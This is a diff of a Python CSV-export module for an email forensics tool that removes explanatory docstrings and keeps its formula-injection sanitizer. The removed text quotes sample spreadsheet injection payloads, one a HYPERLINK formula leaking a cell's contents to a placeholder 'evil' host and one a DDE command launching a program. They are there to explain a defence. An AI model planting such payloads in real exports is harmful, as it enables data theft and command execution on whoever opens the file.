@@ -1,34 +1,4 @@
-"""
-Stage 6 OUTPUT: CSV rendering for the forensic report and the case list.
-
-Two renderers, one file format:
-
-* :func:`render_report_csv` - a single spreadsheet for one case: a key/value
-  header block (report identity, verdict, the five threat-score pillars,
-  origin infrastructure, authentication, evidence hashes and the IOC list)
-  followed by the findings table.
-* :func:`render_case_list_csv` - the whole case list as one row per case, for
-  bulk analysis in Excel, pandas or a pivot table.
-
-Both go through :func:`sanitize_cell`, which is the only interesting part.
-
-Spreadsheet formula injection
------------------------------
-Excel, LibreOffice and Google Sheets treat a cell whose text begins with
-``=``, ``+``, ``-`` or ``@`` as a *formula*, not as text, and older Excel also
-splits on a leading tab or carriage return.  Every string in these exports is
-attacker-controlled: the subject line, the display name, the file name and the
-finding detail all come from a message someone else wrote.  A subject of
-``=HYPERLINK("http://evil/"&A1,"Click")`` or ``=cmd|'/c calc'!A0`` would
-therefore execute in the analyst's spreadsheet the moment the export is
-opened - the exported evidence would attack the investigator.
-
-Quoting is not a defence: RFC 4180 quotes are consumed by the CSV parser and
-the cell still starts with ``=``.  The fix is to make the cell unambiguously
-text by prefixing a single quote, which every major spreadsheet strips on
-display.  It is applied to every cell of every export; none of the numeric
-fields MailTrace writes can be negative, so no number is affected.
-"""
+"""Stage 6 OUTPUT: CSV rendering for the forensic report and the case list."""
 from __future__ import annotations
 
 import csv
@@ -39,17 +9,12 @@ from typing import Any, Iterable
 
 from ..schemas import CaseSummary, ForensicReport, GeoInfo
 
-# Leading characters a spreadsheet reads as the start of a formula (or, for the
-# whitespace pair, as a cell break that can smuggle one in).
 FORMULA_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")
 FORMULA_GUARD = "'"
 
 # RFC 4180 line ending, which is what Excel expects.
 LINE_TERMINATOR = "\r\n"
 
-# Excel assumes the host ANSI code page for a .csv without a byte-order mark,
-# which mangles every non-ASCII sender name.  The BOM is prepended by the API
-# layer so the string renderers stay pure text.
 UTF8_BOM = "\ufeff"
 
 FINDING_COLUMNS: tuple[str, ...] = ("Severity", "Module", "Finding ID", "Title", "Detail", "Evidence (JSON)")
@@ -79,11 +44,7 @@ def _text(value: Any) -> str:
 
 
 def sanitize_cell(value: Any) -> str:
-    """Render ``value`` as a cell that a spreadsheet can only treat as text.
-
-    See the module docstring: a leading ``=``, ``+``, ``-``, ``@``, tab or
-    carriage return is neutralised with a leading single quote.
-    """
+    """Render ``value`` as a cell that a spreadsheet can only treat as text."""
     text = _text(value)
     if text.startswith(FORMULA_PREFIXES):
         return FORMULA_GUARD + text
@@ -124,11 +85,7 @@ def _geo_rows(geo: GeoInfo | None) -> list[tuple[str, Any]]:
 
 
 def render_report_csv(report: ForensicReport) -> str:
-    """The forensic report as one CSV: header block, then the findings table.
-
-    ``report`` is rendered exactly as given, so a masked report produces a
-    masked CSV - the PII policy is applied once, upstream, by the API layer.
-    """
+    """The forensic report as one CSV: header block, then the findings table."""
     result = report.analysis
     verdict = result.verdict
     pillars = verdict.breakdown
